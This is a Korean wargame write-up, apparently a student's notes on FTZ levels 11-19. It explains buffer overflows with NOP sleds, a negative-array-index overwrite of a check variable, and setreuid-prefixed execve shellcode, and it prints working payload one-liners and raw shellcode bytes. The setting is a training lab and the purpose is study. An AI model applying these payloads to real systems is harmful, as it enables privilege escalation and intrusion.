## FTZ 11-19번을 두.번.째 풀면서 공부한 것 



### * 15-17번을 풀며... NOP Sled란 ?  

---

일단 15~17번 문제를 보자. 

![15](C:\Users\96dks\Desktop\15.JPG)

[15번]

![16](C:\Users\96dks\Desktop\16.JPG)

[16번]

![17](C:\Users\96dks\Desktop\17.JPG)

[17번]

위 문제들은 모두 fgets()로 받은 입력값을 버퍼에 저장하고 있다. 

(그런데 잘 보면 모두 버퍼가 할당된 값(20바이트)보다 입력받는 값(45, 48바이트)이 커서 데이터가 넘칠수 있다는 것을 알 수 있다. 취약하다 취약해)

 

아무튼 우리는 버퍼를 아무 값으로 덮어씌우고 RET에 쉘코드 주솟값을 덮어 씌워서 쉘을 따는 게 목적이니까 ! 

페이로드를 작성해 볼건데 !! 

이번에는 "A"가 아닌 "\x90"을 넣어봤다.  왜냐하면 ...

#### * NOP Sled 란? 

> : No-OPeration(실행을 해도 실행할 명령어가 없기때문에 실행포인터가 다음 흐름으로 넘어간다)  Sled(썰매처럼) 
>
> 분기 명령어의 대상을 정확하게 모를 때 고의적으로 실행흐름을 아래로 흘러 보내는데 사용된다. [출처:위키백과]
>
> <사용법>
>
> 공격코드 앞뒤로 아무런 명령을 수행하지않는(연산을 하지않는) NOP == “\x90” 을 넣으면 된다. 

이런 방법도 있더라. 난 원래 계산해서 풀었었는데

두번째로 다시 풀면서 동아리 친구들이 알려줘서 알게 된 방법이다. 



[풀이]

15~17번은 이 방법으로 buf값을 쭉 지나고 RET에 쉘코드 주솟값을 넣어줬다. -끝-



---

### * 18번을 풀며... 배열 음수 인덱스로 접근 ?  

---

이 문제는 소스가 엄청 길다. 문제를 보자. 

 ![18-1](C:\Users\96dks\Desktop\18-1.JPG)

![18-2](C:\Users\96dks\Desktop\18-2.JPG)

(사진이 끊겨있지만 찰떡같이 봐주세요) 

일단 우리가 원하는 건 권한상승+쉘 따기인데 문제를 읽어보니까 맨밑의 shellout()함수에 그 조건이 갖춰져있다. 그러니까 우린 저 함수를 실행시켜야 한다. 

두번째 if문을 보면 check가 deadbeef일 때 shellout함수를 호출한다. 

즉 check를 deadbeef로 채워야한다 !! 

**[이 문제를 풀기 위한 핵심 포인트]**

> 1. 이 문제는 스택 상황을 꼭 꼭 종이에 직접 그려가며 풀어봐야만 한다. 
> 2. switch문 
> 3. 입력 받는 위치가 어디인가? 를 잘 생각해보자 ; 코드가 길어서 어려워보이지만 이것만 명확히하면 문제가 엄청 쉬워지는 개인적인 꿀팁



[풀이]

우선 스택상황은 이렇다. 

> count(=0) 4  + x(=0) 4 + check 4 + string 100 + SFP 4 + RET 4 



그리고 check를 deadbeef로 채우기 위해서 switch문을 정리해보자. 

우선 위부터 두 개의 case는 안봐도 될 것 같고, 의미있는 부분은 

> switch(x) {
>
> case 0x08;
>
> ​	count--;
>
> ​	break;
>
> default;
>
> ​	string[count]=x;
>
> ​	count++;
>
> ​	break;
>
> } 

이다. 내가 생각하기에 여기서 주목할 부분은 

x에 인자값으로 뭘 받느냐에 따라서 count가 --/++되고, 

count가 0으로 초기화된 상태인데 count--;가 되면 default에서 string[-1], string[-2], ... 가 된다는 점이다.  

인덱스 값에 음수가 들어갈 수 있나??? 하고 찾아보니까 다음의 지식을 얻었다. 

> c언어에서 배열을 사용할 때 선언부가 아닌 곳에서 [] 를 사용할 때에는 양수든 음수든 0이든 정수값이면 된다.  [출처:맨 밑에 참고자료 링크]



**그렇다면!** 

count=0인 상황에서 string에 정상적으로 데이터가 쌓였다면 string[0]-> string[1]-> string[2]->...->SFP 로  데이터가 들어가야 하는데 

count가 음수값이면 메모리상에서 string 다음에 할당된 변수 check에 데이터가 들어가는 게 아닐까 ? 하는 기대를 하며 페이로드를 구성해봤다. 

>   $ (python -c 'print "\x08"*4 + "\xef\xbe\xad\xde"';cat) | ./attackme

(설명:)일단 x에 "\x08"을 4번 넣어서 count를 -4로 만들어주면 

default에서 string[-4]=x가 되므로 우리가 예상(기대)하고 있는대로 check에 값을 입력할 수 있게 된다. 

check부분에 deadbeef를 넣어주면 shellout()이 실행된다. -끝-



---

### * 19번을 풀며... 쉘코드

---

앞선 FTZ 문제들은 소스에 setreuid가 지정되어있었다. 

​    ![19](C:\Users\96dks\Desktop\19.JPG)

그런데 19번은 없다 !! 

따라서 19번 쉘코드에는 **<u>이것</u>**이 포함된 쉘코드를 사용해야만 하는데 ...!!



[풀이] 

; 이전에 써온 쉘코드로 공격을 시도해봤지만 공격은 실패했다. 

그것은 문제에 setreuid를 정해주는 부분이 없기때문이다. 

지금까지는 문제에서 setreuid가 설정돼있고 조건을 만족하면 쉘을 얻어냈기때문에 권한이 상승된 채로 쉘을 얻어서 명령어를 입력할 수 있었는데, 

이번 문제에선 권한상승이 되지 않고 쉘만 얻어내서 id, my-pass 등의 명령어를 입력해봤자 19레벨 권한에서만 실행이된다. 즉 20레벨의 권한을 얻지 못한다. 

위에서 말한 **<u>이것</u>**은 바로 setreuid를 지정해주는 코드를 이전에 썼던 쉘코드의 앞에 추가해 주는 것이다. 

이것때문에 쉘코드 만드는 방법까지 찾아보긴했지만, 나는 직접 만들어보진 않았고 

만들어져있던 코드를 빌려와서 문제를 풀었다. 

코드는 다음과 같다 

* 기존코드 (25바이트)

  > export SHELL=`python -c 'print "\x90"*90+"\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"'`

*  setreuid 추가한 코드 (41바이트) 

  > export SHELL=`python -c 'print "\x90"*90+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

-끝-  





#### *참고자료

- 배열의 음수 인덱스

  http://andyader.blogspot.com/2013/09/c-experiment-1.html